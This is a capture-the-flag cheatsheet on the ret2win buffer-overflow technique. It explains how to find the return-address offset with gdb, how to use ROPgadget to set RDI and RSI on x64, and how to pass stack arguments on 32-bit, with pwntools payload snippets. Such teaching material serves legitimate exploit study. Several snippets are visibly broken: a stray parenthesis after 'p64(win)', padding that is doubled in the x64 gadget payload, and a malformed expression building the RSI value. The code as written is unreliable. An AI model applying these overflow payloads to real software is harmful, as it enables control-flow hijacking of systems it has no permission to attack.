ret2win
---
> ret2win refers to challenges where overwriting the return address to a certain function will give the flag.

## x64
Basically if there's a win function in the binary, it has got to be ret2win. Most of the time, it'll be a buffer overflow to control the return address.

The stack may look like this:

```
Buffer                    RBP                       RBP + 8 (RIP)
+-------------------------+-------------------------+-------------------------+
| 41 41 41 41 41 41 41 41 | 00 00 00 00 00 00 00 00 | f5 91 53 13 00 00 00 00 |
+-------------------------+-------------------------+-------------------------+
````

To get the offset of RBP:

```
(gdb)
pattern create 100
r
pattern search $rbp
```

The goal is to overflow input into RBP + 8 (which holds the return address, and change its value to the return address of another function in the binary.
This can be achieved with pwntools via this:
```py
from pwn import *
with process("./binary") as p:
    offset = 8
    win = int(b"0x400df8", 16)
    p.sendline(b'A'*offset + p64(win)(
    p.interactive()
```

### Calling convention
If the win function requires specific parameters to pass, we need to make use of certain snippets of assembly in the program (known as gadgets) to modify the contents of the registers.

The 6 registers used for function parameters (x64) are:
1. RDI
2. RSI
3. RDX
4. RCX
5. R8
6. R9

When a function is called, it takes its parameters from these registers sequentially. Let's say we have a function win(username, password). The value of username is taken from RDI, and password from RSI. So, to control these 2, we need to find certain gadgets in the program that allow us to call them, pop a value from the top of the stack into a register, and return to another address.

To find these gadgets, we can make use of ROPgadget:

```bash
$ ROPgadget --binary ./<binary>

...
0x00000000004010a3 : pop rdi ; ret
0x00000000004010a1 : pop rsi ; pop r15 ; ret
...
```

What do the 2 gadgets above do? The first stores the top value in the stack into RDI, and returns to the address indicated by the second-top value. The second stores the top value into RSI, the second-top value into R15, and returns to the address indicated by the third-top value. Since we're interested in the first 2 registers (RDI and RSI) and not R15, our payload can look something like this:

```py
p.sendline(b'A'*offset + b'A'*offset + p64(0x4010a3) + p64(0xdeadbeef) + p64(0x4010a1) + p64(int([hex(i)[2:] for i in b'password', 16])) + p64(0) + p64(win))
#          offset        offset        1st gadget	   RDI value         2nd gadget      RSI value                                             R15      win function
```

## x32
For 32-bit, we want to control EIP instead. The offset can be easily found using gdb.

```
pattern create 100
r
pattern search $eip
```

The rest of the steps are pretty much similar to x64, so I won't overflow this cheatsheet.

### Calling convention
32-bit calling conventions are much easier to handle as compared to x64: they're all on the stack! This means that we don't need to deal with gadgets etc, which can be useful in some cases where the libc is not loaded into the binary, which means we have a lot less gadgets that we can use. For ret2win, we just need to push our desired values to the stack after calling our gadget/function.

For example:
```py
payload = b'A' * 1337 + p32(0x12345678) + p32(0xdeadbeef) + p32(0xcafebabe)
# 		  win function		first param		  second param and so on...
```

Note that if you want to chain functions after the function with arguments, you need to pop the TOS so that we don't
return to that undefined address. Any register is fine, eg: `pop ebp; ret`.

Another way is to add the 2nd function call between the 1st function and the 1st function's argument.

If your payload doesn't seem to work, try adding some padding between the function call and the argument.
